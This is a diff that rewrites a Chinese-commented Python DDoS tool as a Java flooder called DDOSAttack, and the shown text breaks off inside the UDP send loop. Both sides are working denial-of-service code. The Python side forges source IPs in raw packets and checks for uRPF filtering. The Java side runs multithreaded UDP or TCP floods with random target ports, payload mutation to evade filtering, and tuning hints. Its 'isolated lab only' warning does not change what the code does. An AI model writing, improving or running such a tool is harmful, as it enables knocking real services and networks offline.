@@ -1,445 +1,728 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
+import java.io.*;
+import java.net.*;
+import java.nio.ByteBuffer;
+import java.nio.channels.DatagramChannel;
+import java.util.*;
+import java.util.concurrent.*;
+import java.util.concurrent.atomic.LongAdder;
 
-import sys
-import os
-import time
-import socket
-import ipaddress
-import random
-import struct
-import platform
+public class DDOSAttack {
 
+    // ---------- 共享统计 ----------
+    private static final LongAdder totalSent = new LongAdder();
+    private static final LongAdder totalBytes = new LongAdder();
+    private static final LongAdder totalDropped = new LongAdder();
+    private static volatile boolean stopFlag = false;
 
-# ==================== 跨平台清屏 ====================
-def clear_screen():
-    os.system('cls' if os.name == 'nt' else 'clear')
+    // ---------- 错误计数 ----------
+    private static final LongAdder errBind = new LongAdder();
+    private static final LongAdder errPortUnreachable = new LongAdder();
+    private static final LongAdder errIOException = new LongAdder();
+    private static final LongAdder errOther = new LongAdder();
 
+    // ---------- 错误日志限流器 ----------
+    private static final int ERR_LOG_PER_SEC = 5;
+    private static final int ERR_HISTORY_MAX = 10;
+    private static final Deque<String> recentErrors = new ConcurrentLinkedDeque<>();
+    private static final ErrorRateLimiter errorLimiter = new ErrorRateLimiter(ERR_LOG_PER_SEC);
 
-# ==================== 校验和计算 ====================
-def ip_checksum(data: bytes) -> int:
-    """
-    标准 16-bit 反码校验和（RFC 1071）。
-    用于 IP 头或 UDP 伪头 + UDP 头 + 载荷。
-    """
-    if len(data) % 2:
-        data += b'\x00'
-    s = 0
-    for i in range(0, len(data), 2):
-        s += (data[i] << 8) + data[i + 1]
-        s = (s & 0xFFFF) + (s >> 16)
-    return ~s & 0xFFFF
+    // ---------- 配置 ----------
+    private static String targetIP;
+    private static int targetPort;
+    private static long totalPackets;
+    private static int packetSize = 1490;
+    private static int numThreads = 4;
+    private static int burstSize = 50;
+    private static double rateLimit = 0.0;
+    private static int duration = 0;
+    private static int srcPortBase = -1;
+    private static boolean randomTargetPort = false;
+    private static boolean bindLocal = false;
+    private static boolean varyPayload = true;
+    private static boolean useTcp = false;
+    private static String logFile = null;
+    private static int maxRetries = 3;
 
+    private static PrintWriter logWriter = null;
+    private static InetSocketAddress[] portAddresses;
+    private static List<InetAddress> localAddresses = new ArrayList<>();
 
-def udp_checksum(src_ip: str, dst_ip: str, udp_header: bytes, payload: bytes) -> int:
-    """
-    UDP 校验和：需要伪头（src + dst + zero + proto + udp_len）。
-    udp_header 传入时 checksum 字段必须为 0。
-    """
-    pseudo = (socket.inet_aton(src_ip) +
-              socket.inet_aton(dst_ip) +
-              b'\x00\x11' +
-              struct.pack('!H', len(udp_header) + len(payload)))
-    result = ip_checksum(pseudo + udp_header + payload)
-    # UDP 校验和 0 表示"不校验"，接收方会跳过；
-    # 为避免被防火墙/conntrack 丢弃，结果为 0 时改为 0xFFFF。
-    return result if result != 0 else 0xFFFF
+    // ===================================================================
+    // 内部辅助类
+    // ===================================================================
 
+    /** 令牌桶：用于精确长期速率控制 + 允许短时突发。 */
+    static class TokenBucket {
+        private final double capacity;
+        private final double refillPerSec;
+        private double tokens;
+        private long lastRefillNs;
 
-# ==================== 本地网络探测 ====================
-def get_local_ip_and_subnet():
-    """
-    通过 UDP connect 探测定本地出口 IP（不实际发包）。
-    返回 (ip_str, ip_network)，失败返回 (None, None)。
-    """
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.settimeout(0.1)
-        s.connect(("8.8.8.8", 80))
-        local_ip = s.getsockname()[0]
-        s.close()
-        # 假设 /24，这是最保守的估计；精确子网需要 netifaces 等库
-        net = ipaddress.ip_network(f"{local_ip}/24", strict=False)
-        return local_ip, net
-    except Exception:
-        return None, None
+        TokenBucket(double capacity, double refillPerSec) {
+            this.capacity = capacity;
+            this.refillPerSec = refillPerSec;
+            this.tokens = capacity;
+            this.lastRefillNs = System.nanoTime();
+        }
 
+        private void refill() {
+            long now = System.nanoTime();
+            double elapsed = (now - lastRefillNs) / 1e9;
+            if (elapsed > 0) {
+                tokens = Math.min(capacity, tokens + elapsed * refillPerSec);
+                lastRefillNs = now;
+            }
+        }
 
-# ==================== 伪造 IP 合法性检查 ====================
-def validate_spoof_ip(spoof_ip: str, target_ip: str, local_net) -> tuple:
-    """
-    返回 (is_valid, message)。
-    message 可能为 Warning（依然允许发送）或拒绝原因。
-    """
-    try:
-        s = ipaddress.ip_address(spoof_ip)
-        t = ipaddress.ip_address(target_ip)
-    except ValueError:
-        return False, "无效的 IP 地址"
+        /** 令牌充足返回 0；否则返回需要等待的纳秒数。 */
+        synchronized long nanosToWait(int need) {
+            refill();
+            if (tokens >= need) {
+                tokens -= need;
+                return 0;
+            }
+            double missing = need - tokens;
+            return (long) ((missing / refillPerSec) * 1e9);
+        }
+    }
 
-    if not isinstance(s, ipaddress.IPv4Address):
-        return False, "仅支持 IPv4 伪造"
+    /** 令牌桶式错误限流器，避免日志刷屏。 */
+    static class ErrorRateLimiter {
+        private final int maxPerSec;
+        private long windowStart;
+        private int count;
+        private long suppressed;
 
-    if s.is_loopback:
-        return False, f"拒绝伪造 {spoof_ip}：回环地址 (127.0.0.0/8)"
-    if s.is_multicast:
-        return False, f"拒绝伪造 {spoof_ip}：组播地址 (224.0.0.0/4)"
-    if s.is_unspecified:
-        return False, f"拒绝伪造 {spoof_ip}：0.0.0.0 无意义"
-    if s.is_reserved:
-        return False, f"拒绝伪造 {spoof_ip}：保留地址 (240.0.0.0/4)"
-    if s.is_link_local:
-        return False, f"拒绝伪造 {spoof_ip}：链路本地地址 (169.254.0.0/16)"
-    if s == t:
-        return False, f"拒绝伪造：伪造 IP 不能等于目标 IP"
-    if s.is_private and local_net and s not in local_net:
-        return True, (f"警告：{spoof_ip} 是私有地址但不在本机子网 {local_net}，"
-                      f"跨路由伪造会被上游 uRPF 过滤，实际可能无效")
+        ErrorRateLimiter(int maxPerSec) {
+            this.maxPerSec = maxPerSec;
+            this.windowStart = System.currentTimeMillis();
+        }
 
-    if local_net and s not in local_net:
-        return True, (f"警告：{spoof_ip} 不在本机子网 {local_net} 内，"
-                      f"跨路由伪造会被上游 uRPF 过滤，实际可能无效")
+        synchronized boolean allow() {
+            long now = System.currentTimeMillis();
+            if (now - windowStart > 1000) {
+                windowStart = now;
+                count = 0;
+            }
+            if (count < maxPerSec) {
+                count++;
+                return true;
+            }
+            suppressed++;
+            return false;
+        }
 
-    return True, f"OK：{spoof_ip} 在本机子网 {local_net} 内（最佳场景）"
+        synchronized long suppressed() { return suppressed; }
+    }
 
+    // ===================================================================
+    // 主函数
+    // ===================================================================
+    public static void main(String[] args) throws Exception {
+        if (args.length == 0) {
+            printUsage();
+            System.exit(0);
+        }
+        parseArgs(args);
 
-# ==================== 构造 IP + UDP 包 ====================
-def build_ip_udp_packet(spoof_ip: str, target_ip: str,
-                        src_port: int, dst_port: int,
-                        payload: bytes, ttl: int = 64) -> bytes:
-    """
-    完整构造带正确校验和的 IPv4 + UDP 包。
-    DF 位强制开启（不分片），因此 payload 长度必须 ≤ 1472。
-    """
-    ip_header_len = 20
-    udp_header_len = 8
-    total_len = ip_header_len + udp_header_len + len(payload)
+        if (logFile != null) {
+            try {
+                logWriter = new PrintWriter(new FileWriter(logFile, true));
+            } catch (IOException e) {
+                System.err.println("[!] 无法打开日志文件: " + e.getMessage());
+            }
+        }
 
-    # IP 头字段
-    ip_ver_ihl = 0x45                      # IPv4, IHL=5 (20 bytes)
-    ip_tos = 0
-    ip_id = random.randint(0, 0xFFFF)
-    ip_frag_off = 0x4000                   # DF=1, MF=0, offset=0
-    ip_ttl = ttl
-    ip_proto = socket.IPPROTO_UDP
-    ip_saddr = socket.inet_aton(spoof_ip)
-    ip_daddr = socket.inet_aton(target_ip)
+        try {
+            InetAddress.getByName(targetIP);
+        } catch (UnknownHostException e) {
+            System.err.println("[!] 无效的目标 IP: " + targetIP);
+            System.exit(1);
+        }
+        if (targetPort < 1 || targetPort > 65535) {
+            System.err.println("[!] 端口超出范围: " + targetPort);
+            System.exit(1);
+        }
+        if (packetSize < 64) packetSize = 64;
+        if (packetSize > 65000) packetSize = 65000;
+        if (totalPackets <= 0) {
+            System.err.println("[!] 总包数必须 > 0");
+            System.exit(1);
+        }
 
-    # 第一次：checksum=0，算出来
-    ip_header = struct.pack('!BBHHHBBH4s4s',
-                            ip_ver_ihl, ip_tos, total_len,
-                            ip_id, ip_frag_off,
-                            ip_ttl, ip_proto, 0,
-                            ip_saddr, ip_daddr)
-    ip_check = ip_checksum(ip_header)
+        if (randomTargetPort && !useTcp) {
+            portAddresses = new InetSocketAddress[65536];
+            for (int i = 1; i <= 65535; i++) {
+                portAddresses[i] = new InetSocketAddress(targetIP, i);
+            }
+        }
 
-    # 第二次：填入正确 checksum
-    ip_header = struct.pack('!BBHHHBBH4s4s',
-                            ip_ver_ihl, ip_tos, total_len,
-                            ip_id, ip_frag_off,
-                            ip_ttl, ip_proto, ip_check,
-                            ip_saddr, ip_daddr)
+        if (bindLocal) {
+            enumerateLocalAddresses();
+            if (localAddresses.isEmpty()) {
+                System.err.println("[!] 未找到可用本地地址，已禁用 --bind-local。");
+                bindLocal = false;
+            } else {
+                System.out.printf("[+] --bind-local 已启用，可用本地地址 %d 个。%n",
+                        localAddresses.size());
+            }
+        }
 
-    # UDP 头
-    udp_len = udp_header_len + len(payload)
-    udp_header = struct.pack('!HHHH', src_port, dst_port, udp_len, 0)
-    udp_check = udp_checksum(spoof_ip, target_ip, udp_header, payload)
-    udp_header = struct.pack('!HHHH', src_port, dst_port, udp_len, udp_check)
+        printKernelTuningHints();
 
-    return ip_header + udp_header + payload
+        System.out.printf("[+] target=%s:%d  proto=%s  traffic=%.2fGB  packets=%d  threads=%d  size=%dB%s%s%n",
+                targetIP, targetPort, useTcp ? "TCP" : "UDP",
+                (double) totalPackets * packetSize / (1024.0 * 1024 * 1024),
+                totalPackets, numThreads, packetSize,
+                randomTargetPort ? "  random-port" : "",
+                varyPayload ? "  vary" : "");
+        if (bindLocal) {
+            System.out.println("[+] 每线程绑定不同本地源 IP（Java 无法伪造源 IP）");
+        }
+        if (rateLimit > 0) {
+            System.out.printf("[+] 令牌桶速率：目标 ≈ %.0f pps%n",
+                    burstSize / rateLimit);
+        }
+        System.out.println("[+] 攻击中... (Ctrl+C 停止)");
 
+        Runtime.getRuntime().addShutdownHook(new Thread(() -> stopFlag = true));
 
-# ==================== 普通模式：TCP 连通性检查 ====================
-def check_target(ip: str, port: int, timeout: float = 1.0) -> bool:
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(timeout)
-        s.connect((ip, port))
-        s.close()
-        return True
-    except (socket.timeout, ConnectionRefusedError, OSError):
-        return False
+        long startTime = System.currentTimeMillis();
+        if (useTcp) {
+            startTcpAttack();
+        } else {
+            startUdpAttack();
+        }
+        long elapsed = System.currentTimeMillis() - startTime;
 
+        long finalSent = totalSent.longValue();
+        long finalBytes = totalBytes.longValue();
+        long finalDropped = totalDropped.longValue();
+        double rate = elapsed > 0 ? finalSent / (elapsed / 1000.0) : 0;
 
-# ==================== 启动画面 ====================
-def show_banner():
-    clear_screen()
-    print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   Sucodesu")
-    print("M       MMM M       MMM MMM     MMM MM       MM   Sucodesu")
-    print("M  MMMM   M M  MMMM   M M   MMM   M M  MMMMM  M   Sucodesu")
-    print("M  MMMMM  M M  MMMMM  M M  MMMMM  M M        MM   Sucodesu")
-    print("M  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M   Sucodesu")
-    print("M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M   Sucodesu")
-    print("M        MM M        MM MMM     MMM MM       MM   Sucodesu")
-    print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   Sucodesu")
-    print("======================= 严重警告 =========================")
-    print("你正在跨越法律和道德的边界。请立即退出，或等待 3 秒后启动。")
-    print("仅限你拥有完全控制权的隔离实验环境。")
-    print("=========================================================")
-    time.sleep(1)
-    print("3"); time.sleep(1)
-    print("2"); time.sleep(1)
-    print("1"); time.sleep(1)
-    print("Starting...")
-    time.sleep(1)
+        System.out.printf("%n[=] 完成: 发送 %d 包, 丢弃 %d, %.4f GB, %.2fs, %.1f pps%n",
+                finalSent, finalDropped, finalBytes / (1024.0 * 1024 * 1024),
+                elapsed / 1000.0, rate);
+        System.out.printf("[=] 错误: bind=%d  端口不可达=%d  IO=%d  其他=%d  (已抑制=%d)%n",
+                errBind.longValue(), errPortUnreachable.longValue(),
+                errIOException.longValue(), errOther.longValue(),
+                errorLimiter.suppressed());
+        if (!recentErrors.isEmpty()) {
+            System.out.println("[=] 最近错误：");
+            for (String e : recentErrors) {
+                System.out.println("    " + e);
+            }
+        }
 
-    clear_screen()
-    ret = os.system("figlet DDOS-Attack 2>/dev/null" if os.name != 'nt' else "figlet DDOS-Attack 2>nul")
-    if ret != 0:
-        print(r" ____  ____   ___  ____          _   _   _             _     ")
-        print(r"|  _ \|  _ \ / _ \/ ___|        / \ | |_| |_ __ _  ___| | __ ")
-        print(r"| | | | | | | | | \___ \ _____ / _ \| __| __/ _` |/ __| |/ / ")
-        print(r"| |_| | |_| | |_| |___) |_____/ ___ \ |_| || (_| | (__|   <  ")
-        print(r"|____/|____/ \___/|____/     /_/   \_\__|\__\__,_|\___|_|\_\ ")    
-    print("====================================================================")
-    print("Author  : Su-StackTrace")
-    print("GitHub  : https://github.com/BC-809/DDoS-Attack_t3g85hxb670.git")
-    print("====================================================================")
-    print("")
+        if (logWriter != null) {
+            logWriter.printf("done: sent=%d dropped=%d bytes=%d time=%.2fs rate=%.1fpps%n",
+                    finalSent, finalDropped, finalBytes, elapsed / 1000.0, rate);
+            logWriter.close();
+        }
+    }
 
+    // ===================================================================
+    // 内核调优提示
+    // ===================================================================
+    private static void printKernelTuningHints() {
+        String os = System.getProperty("os.name").toLowerCase();
+        if (os.contains("linux")) {
+            System.out.println("[+] Linux 内核调优建议（在本机执行，需要 root）：");
+            System.out.println("    sysctl -w net.core.wmem_max=8388608 net.core.rmem_max=8388608");
+            System.out.println("    sysctl -w net.ipv4.udp_mem='65536 131072 262144'");
+            System.out.println("    ulimit -n 65535");
+        }
+    }
 
-# ==================== 主程序 ====================
-def main():
-    show_banner()
+    // ===================================================================
+    // 帮助
+    // ===================================================================
+    private static void printUsage() {
+        System.out.println("[+] 用法: java DDOSAttack -t <IP> -p <PORT> -g <GB> [选项]");
+        System.out.println();
+        System.out.println("[+] 必填参数：");
+        System.out.println("  -t, --target        目标 IP");
+        System.out.println("  -p, --port          目标端口");
+        System.out.println("  -g, --gb            总流量（GB）");
+        System.out.println();
+        System.out.println("[+] 可选参数：");
+        System.out.println("  -P, --processes     线程数（默认 4）");
+        System.out.println("  -b, --burst         每突发包数（默认 50）");
+        System.out.println("  -r, --rate          每突发秒数（默认 0 = 不限速）");
+        System.out.println("                      由令牌桶强制，长期速率 = burstSize/rate pps。");
+        System.out.println("  -d, --duration      持续时间（秒，默认 0 = 直到发完）");
+        System.out.println("  -s, --src-port      源端口基数（默认 -1 = 随机）");
+        System.out.println("  --size              基础包大小（默认 1490）");
+        System.out.println("  --random-port       随机目标端口（仅 UDP）");
+        System.out.println("  --bind-local        每个线程绑定不同的本地网卡 IP");
+        System.out.println("  --tcp               使用完整 TCP 连接（不是 SYN 洪泛）");
+        System.out.println("  --vary / --no-vary  启用/关闭 payload 变异（默认：启用）");
+        System.out.println("  --log <file>        日志文件路径");
+        System.out.println("  --max-retries       每包最大发送重试次数（默认 3）");
+        System.out.println("  -h, --help          显示本帮助");
+    }
 
-    # ---------- 目标 IP ----------
-    while True:
-        try:
-            ip_str = input("[?] 目标 IP 地址: ").strip()
-            ipaddress.ip_address(ip_str)
-            target_ip = ip_str
-            break
-        except ValueError:
-            print("[!] 无效的 IP 地址，请重新输入")
+    // ===================================================================
+    // 参数解析
+    // ===================================================================
+    private static void parseArgs(String[] args) {
+        Map<String, String> params = new HashMap<>();
+        for (int i = 0; i < args.length; i++) {
+            if (args[i].startsWith("-")) {
+                if (i + 1 < args.length && !args[i + 1].startsWith("-")) {
+                    params.put(args[i], args[i + 1]);
+                    i++;
+                } else {
+                    params.put(args[i], "true");
+                }
+            }
+        }
 
-    # ---------- 目标端口 ----------
-    while True:
-        try:
-            port_str = input("[?] 目标端口: ").strip()
-            target_port = int(port_str)
-            if 1 <= target_port <= 65535:
-                break
-            print("[!] 端口必须在 1-65535 之间")
-        except ValueError:
-            print("[!] 无效的端口号")
+        if (params.containsKey("-h") || params.containsKey("--help")) {
+            printUsage();
+            System.exit(0);
+        }
 
-    # ---------- 总流量 ----------
-    while True:
-        try:
-            gb_str = input("[?] 发送总流量 (GB): ").strip()
-            total_gb = float(gb_str)
-            if total_gb > 0:
-                break
-            print("[!] 流量必须大于 0 GB")
-        except ValueError:
-            print("[!] 无效的数值")
+        targetIP = params.getOrDefault("-t", params.get("--target"));
+        if (targetIP == null) { System.err.println("[!] 缺少 -t/--target"); System.exit(1); }
 
-    # ---------- 速率限制 ----------
-    rate_limit = 0.0
-    try:
-        rate_str = input("[?] 发包间隔（秒，0=不限速）: ").strip()
-        if rate_str:
-            rate_limit = float(rate_str)
-    except ValueError:
-        rate_limit = 0.0
+        String portStr = params.getOrDefault("-p", params.get("--port"));
+        if (portStr == null) { System.err.println("[!] 缺少 -p/--port"); System.exit(1); }
+        targetPort = Integer.parseInt(portStr);
 
-    # ---------- 伪造源 IP ----------
-    print("\n--- 源 IP 模式 ---")
-    print("[*] 留空 = 使用本机真实源 IP（普通 UDP）")
-    print("[*] 输入 IP = 伪造该 IP（需 root / 管理员权限）")
-    spoof_ip = input("[?] 伪造源 IP: ").strip()
+        String gbStr = params.getOrDefault("-g", params.get("--gb"));
+        if (gbStr == null) { System.err.println("[!] 缺少 -g/--gb"); System.exit(1); }
+        double gb = Double.parseDouble(gbStr);
 
-    local_ip, local_net = get_local_ip_and_subnet()
-    if local_ip:
-        print(f"[>] 本机出口 IP: {local_ip}，推测子网: {local_net}")
-    else:
-        print("[>] 无法探测本机子网，uRPF 检查将跳过")
+        if (params.containsKey("-P")) numThreads = Integer.parseInt(params.get("-P"));
+        if (params.containsKey("-T")) numThreads = Integer.parseInt(params.get("-T"));
+        if (params.containsKey("-b")) burstSize = Integer.parseInt(params.get("-b"));
+        if (params.containsKey("-r")) rateLimit = Double.parseDouble(params.get("-r"));
+        if (params.containsKey("-d")) duration = Integer.parseInt(params.get("-d"));
+        if (params.containsKey("-s")) srcPortBase = Integer.parseInt(params.get("-s"));
+        if (params.containsKey("--size")) packetSize = Integer.parseInt(params.get("--size"));
+        if (params.containsKey("--random-port")) randomTargetPort = true;
+        if (params.containsKey("--bind-local")) bindLocal = true;
+        if (params.containsKey("--tcp")) useTcp = true;
+        if (params.containsKey("--no-vary")) varyPayload = false;
+        if (params.containsKey("--vary")) varyPayload = true;
+        if (params.containsKey("--log")) logFile = params.get("--log");
+        if (params.containsKey("--max-retries")) maxRetries = Integer.parseInt(params.get("--max-retries"));
 
-    if spoof_ip:
-        valid, msg = validate_spoof_ip(spoof_ip, target_ip, local_net)
-        if not valid:
-            print(f"[!] {msg}")
-            print("[!] 拒绝伪造该地址，退出")
-            sys.exit(1)
-        print(f"[>] {msg}")
+        if (gb <= 0) { System.err.println("[!] GB 必须 > 0"); System.exit(1); }
+        totalPackets = (long) (gb * 1024 * 1024 * 1024 / packetSize);
+        if (totalPackets <= 0) { System.err.println("[!] 流量太小"); System.exit(1); }
+    }
 
-        # 伪造模式参数
-        ttl = 64
-        try:
-            ttl_str = input("[?] TTL (默认 64): ").strip()
-            if ttl_str:
-                ttl = int(ttl_str)
-                if not 1 <= ttl <= 255:
-                    ttl = 64
-        except ValueError:
-            ttl = 64
+    // ===================================================================
+    // 本地地址枚举
+    // ===================================================================
+    private static void enumerateLocalAddresses() {
+        try {
+            Enumeration<NetworkInterface> ifaces = NetworkInterface.getNetworkInterfaces();
+            if (ifaces == null) return;
+            for (NetworkInterface iface : Collections.list(ifaces)) {
+                if (!iface.isUp() || iface.isLoopback()) continue;
+                for (InterfaceAddress ia : iface.getInterfaceAddresses()) {
+                    InetAddress addr = ia.getAddress();
+                    if (addr instanceof Inet4Address) {
+                        localAddresses.add(addr);
+                    }
+                }
+            }
+        } catch (SocketException e) {
+            System.err.println("[!] 枚举网卡失败: " + e.getMessage());
+        }
+    }
 
-        # 强制 DF，payload 上限 1472
-        PACKET_SIZE = 1472
-        try:
-            size_str = input("[?] 包大小（字节，默认 1472，DF 模式下最大 1472）: ").strip()
-            if size_str:
-                PACKET_SIZE = int(size_str)
-                if PACKET_SIZE > 1472:
-                    print(f"[!] DF 模式下 payload 最大 1472，已截断")
-                    PACKET_SIZE = 1472
-                if PACKET_SIZE < 28:
-                    PACKET_SIZE = 28
-        except ValueError:
-            pass
+    // ===================================================================
+    // 错误记录（限流）
+    // ===================================================================
+    private static void recordError(String msg) {
+        if (!errorLimiter.allow()) return;
+        recentErrors.addLast(msg);
+        while (recentErrors.size() > ERR_HISTORY_MAX) {
+            recentErrors.pollFirst();
+        }
+    }
 
-        use_spoof = True
-        use_fragmentation = False
-        random_target_port = False
-        source_port = None
+    // ===================================================================
+    // Payload 池（DirectByteBuffer）
+    // ===================================================================
+    private static List<ByteBuffer> buildDirectPayloadPool(int baseSize, int poolSize) {
+        Random rnd = new Random();
+        int delta = varyPayload ? Math.max(1, baseSize / 10) : 0;
+        List<ByteBuffer> pool = new ArrayList<>(poolSize);
+        for (int i = 0; i < poolSize; i++) {
+            int len = baseSize - delta + (delta > 0 ? rnd.nextInt(delta * 2 + 1) : 0);
+            if (len < 64) len = 64;
+            if (len > 65000) len = 65000;
 
-        rnd = input("[?] 随机目标端口? (y/N): ").strip().lower()
-        if rnd == 'y':
-            random_target_port = True
+            ByteBuffer buf = ByteBuffer.allocateDirect(len);
+            byte[] tmp = new byte[len];
+            rnd.nextBytes(tmp);
+            buf.put(tmp);
+            buf.flip();
+            pool.add(buf);
+        }
+        return pool;
+    }
 
-        print(f"\n[>] 伪造模式：")
-        print(f"    伪造源 IP : {spoof_ip}")
-        print(f"    TTL        : {ttl}")
-        print(f"    包大小     : {PACKET_SIZE} 字节 (DF 位已开启)")
+    // ===================================================================
+    // UDP 攻击（主路径）—— 已修复：精确包数，增量统计
+    // ===================================================================
+    private static void startUdpAttack() throws Exception {
+        ExecutorService executor = Executors.newFixedThreadPool(numThreads);
+        List<Future<?>> futures = new ArrayList<>();
+        long packetsPerThread = totalPackets / numThreads;
+        long extra = totalPackets % numThreads;
 
-    else:
-        use_spoof = False
-        ttl = 64
+        final int poolSize = 512;
 
-        src = input("[?] 指定源端口 (留空则系统随机分配): ").strip()
-        source_port = int(src) if src else None
+        for (int i = 0; i < numThreads; i++) {
+            long pktCount = packetsPerThread + (i < extra ? 1 : 0);
+            int threadId = i;
+            Runnable task = () -> {
+                String tag = "T" + threadId;
+                ThreadLocalRandom rnd = ThreadLocalRandom.current();
+                List<ByteBuffer> pool = buildDirectPayloadPool(packetSize, poolSize);
 
-        frag = input("[?] 启用 IP 分片? (y/N): ").strip().lower()
-        use_fragmentation = (frag == 'y')
+                DatagramChannel channel = null;
+                TokenBucket bucket = null;
+                if (rateLimit > 0) {
+                    bucket = new TokenBucket(burstSize * 2.0, burstSize / rateLimit);
+                }
 
-        rnd = input("[?] 使用随机目标端口? (y/N): ").strip().lower()
-        random_target_port = (rnd == 'y')
+                int consecutiveFailures = 0;
 
-        PACKET_SIZE = 3000 if use_fragmentation else 1472
-        print(f"\n[>] 普通模式：")
-        print(f"    包大小     : {PACKET_SIZE} 字节")
+                try {
+                    channel = openUdpChannelForThread(threadId);
+                    InetSocketAddress dest = new InetSocketAddress(targetIP, targetPort);
 
-    total_bytes = int(total_gb * 1024 * 1024 * 1024)
-    max_packets = total_bytes // PACKET_SIZE
+                    // 注意：sent/bytesSent/dropped 是累计计数器，绝不清零。
+                    // 每次只上报自上次刷新以来的增量。
+                    long sent = 0, bytesSent = 0, dropped = 0;
+                    long lastReportedSent = 0, lastReportedBytes = 0, lastReportedDropped = 0;
+                    long packetCounter = 0;
 
-    # ---------- 摘要 ----------
-    print(f"\n[>] 将发送 {max_packets} 个数据包，总计 {total_gb:.2f} GB")
-    if rate_limit > 0:
-        print(f"[>] 发包间隔: {rate_limit} 秒")
-    if use_spoof:
-        print(f"[>] 原始套接字模式（需要 root / 管理员权限）")
-    else:
-        print(f"[>] 普通 UDP 模式")
-    if random_target_port:
-        print(f"[>] 随机目标端口: 启用")
+                    while (!stopFlag && sent < pktCount) {
+                        int toSend = (int) Math.min(burstSize, pktCount - sent);
 
-    # ---------- 连通性检查（仅普通模式） ----------
-    if not use_spoof:
-        print("[>] 检查目标连通性 (TCP)...")
-        if not check_target(target_ip, target_port):
-            print("[!] 目标 TCP 不可达（注意：TCP 可达 ≠ UDP 可达）")
-            choice = input("[?] 仍要继续? (y/N): ").strip().lower()
-            if choice != 'y':
-                print("[>] 用户取消")
-                sys.exit(0)
+                        if (bucket != null) {
+                            long waitNs = bucket.nanosToWait(toSend);
+                            if (waitNs > 0) {
+                                TimeUnit.NANOSECONDS.sleep(waitNs);
+                            }
+                        }
 
-    # ---------- 最终确认 ----------
-    print("\n[!] 最后警告：你即将发送大量 UDP 流量。")
-    print("[!] 请确认这是你拥有完全授权的隔离设备。")
-    confirm = input("[?] 确认 (yes/no): ").strip().lower()
-    if confirm != 'yes':
-        print("[>] 用户取消")
-        sys.exit(0)
+                        for (int j = 0; j < toSend; j++) {
+                            if (stopFlag || sent >= pktCount) break;
 
-    # ---------- 创建套接字 ----------
-    if use_spoof:
-        if platform.system() == "Windows":
-            print("[>] Windows 下原始套接字需要管理员权限")
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-        except PermissionError:
-            print("[!] 创建原始套接字失败，请用 sudo / root / 管理员权限运行")
-            sys.exit(1)
-        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-    else:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        if source_port is not None:
-            try:
-                sock.bind(('', source_port))
-            except OSError as e:
-                print(f"[!] 无法绑定源端口 {source_port}: {e}")
-                sock.close()
-                sys.exit(1)
-        if use_fragmentation:
-            try:
-                if hasattr(socket, 'IP_MTU_DISCOVER'):
-                    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MTU_DISCOVER, socket.IP_PMTUDISC_DO)
-                    if hasattr(socket, 'IP_DONTFRAGMENT'):
-                        sock.setsockopt(socket.IPPROTO_IP, socket.IP_DONTFRAGMENT, 0)
-            except (AttributeError, OSError) as e:
-                print(f"[!] 启用分片失败 ({e})，改用普通模式")
-                PACKET_SIZE = 1472
-                total_bytes = int(total_gb * 1024 * 1024 * 1024)
-                max_packets = total_bytes // PACKET_SIZE
+                            ByteBuffer buf = pool.get((int) (packetCounter % pool.size()));
+                            int limit = buf.limit();
+                            if (limit < 8) continue;
 
-    payload = os.urandom(PACKET_SIZE)
-    sent = 0
-    sent_bytes = 0
-    next_mb = 1024 * 1024
-    start_time = time.time()
+                            // 将最后 8 字节覆盖为计数器
+                            long c = packetCounter;
+                            for (int b = 0; b < 8; b++) {
+                                buf.put(limit - 1 - b, (byte) (c & 0xFF));
+                                c >>>= 8;
+                            }
+                            // 前部附近 16 字节 XOR 随机翻转
+                            if (varyPayload && limit >= 24) {
+                                int base = 4;
+                                for (int b = 0; b < 16; b++) {
+                                    int idx = base + b;
+                                    byte v = buf.get(idx);
+                                    buf.put(idx, (byte) (v ^ (byte) rnd.nextInt(256)));
+                                }
+                            }
+                            packetCounter++;
 
-    print(f"\n[>] 开始发送... (Ctrl+C 停止)")
+                            InetSocketAddress targetAddr;
+                            if (randomTargetPort) {
+                                int port = rnd.nextInt(1, 65536);
+                                targetAddr = portAddresses[port];
+                            } else {
+                                targetAddr = dest;
+                            }
 
-    try:
-        while sent < max_packets:
-            if random_target_port:
-                current_port = random.randint(1, 65535)
-            else:
-                current_port = target_port
+                            boolean ok = sendUdpWithRetry(channel, buf, targetAddr, tag);
+                            if (ok) {
+                                sent++;
+                                bytesSent += limit;
+                                consecutiveFailures = 0;
+                            } else {
+                                dropped++;
+                                consecutiveFailures++;
+                                if (consecutiveFailures >= 3) {
+                                    long backoffMs = Math.min(1000, 10L << Math.min(consecutiveFailures - 3, 6));
+                                    Thread.sleep(backoffMs);
+                                    if (channel == null || !channel.isOpen()) {
+                                        try { channel = openUdpChannelForThread(threadId); } catch (Exception ignore) {}
+                                    }
+                                }
+                            }
+                        }
 
-            try:
-                if use_spoof:
-                    src_port = source_port if source_port else random.randint(1024, 65535)
-                    packet = build_ip_udp_packet(
-                        spoof_ip, target_ip,
-                        src_port, current_port,
-                        payload, ttl
-                    )
-                    # IP_HDRINCL 下端口被忽略，传 0 更严谨
-                    sock.sendto(packet, (target_ip, 0))
-                else:
-                    sock.sendto(payload, (target_ip, current_port))
+                        // 增量刷新：只加差值，不重置 sent
+                        long dSent = sent - lastReportedSent;
+                        long dBytes = bytesSent - lastReportedBytes;
+                        long dDropped = dropped - lastReportedDropped;
+                        if (dSent > 0) totalSent.add(dSent);
+                        if (dBytes > 0) totalBytes.add(dBytes);
+                        if (dDropped > 0) totalDropped.add(dDropped);
+                        lastReportedSent = sent;
+                        lastReportedBytes = bytesSent;
+                        lastReportedDropped = dropped;
+                    }
 
-                sent += 1
-                sent_bytes += PACKET_SIZE
+                    // 循环退出后最后一次刷新（防止漏报）
+                    long dSent = sent - lastReportedSent;
